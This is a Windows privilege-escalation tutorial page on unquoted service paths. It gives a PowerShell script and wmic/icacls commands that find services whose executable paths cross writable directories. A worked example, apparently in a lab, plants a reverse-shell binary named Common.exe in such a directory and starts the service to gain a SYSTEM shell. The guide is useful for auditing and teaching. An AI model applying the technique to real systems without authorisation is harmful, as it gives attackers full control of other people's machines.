# Unquoted Paths

System services are typically executed with high integrity under the SYSTEM account. Additionally, they are often installed by third-party applications that may not adequately account for security measures, leaving potential vulnerabilities that attackers can exploit.

In some cases, services fail to use quotes around the path to the executable, creating a vulnerability that can be exploited by an attacker leveraging the way Windows interprets paths with spaces.

## Services with Unquoted Paths

This script checks all unquoted paths and verifies whether the user can modify any of the directories derived from them based on Windows' typical path interpretation.

> [!NOTE]
> Requires auxiliary function.

```powershell
$vuln = Get-WmiObject -Class win32_service | 
        Where-Object {$_ -and ($Null -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'}
ForEach ($serv in $vuln) {
    $SplitPathArray = $serv.pathname.Split(' ')
    $ConcatPathArray = @()
    for ($i=0;$i -lt $SplitPathArray.Count; $i++) {
        $ConcatPathArray += $SplitPathArray[0..$i] -join ' '
    }
    ModifiablePath $ConcatPathArray
}
```

Alternatively, you can perform a manual check with CMD and `icacls`, though this process is more hands-on.

```batch
:: List all services with unquoted paths
wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "Auto" 2>nul | findstr /i /v "C:\Windows\\" 2>nul | findstr /i /v """

:: Check the permissions of the directory and its subdirectories as Windows interprets them.
icacls [service_path]
```

### Attack

If one of these directories can be modified, place a malicious executable with the name derived from where the path truncates and ending in `.exe`.

## Example

**First, copy and paste to load the auxiliary function.**

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/regPerm_1.png)

Next, copy and paste the suggested script, which searches for all services with unquoted paths and reviews the permissions of the directories leading to them for any vulnerable points.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/unquoted_1.png)

As shown, a service called `unquotedsvc` appears with a directory that has weak permissions. Let's first examine the service information and retrieve the binary path.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/unquoted_2.png)

The path contains several spaces, so we will check the permissions of each directory and subdirectory using **cacls** to find the vulnerable point.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/unquoted_3.png)

We identify a vulnerable subdirectory that grants full permissions to all users on the system. Taking advantage of how Windows parses paths with spaces, we create a reverse shell and place it in the directory `_C:\Program Files\Unquoted Path Service_` with the name `Common.exe`. This ensures that it will be executed without traversing higher directories.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/unquoted_4.png)

Finally, manually start the service with the following command.

```batch
net start unquotedsvc
```

Within seconds, we have a reverse shell connection running as SYSTEM.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/services/unquoted_5.png)
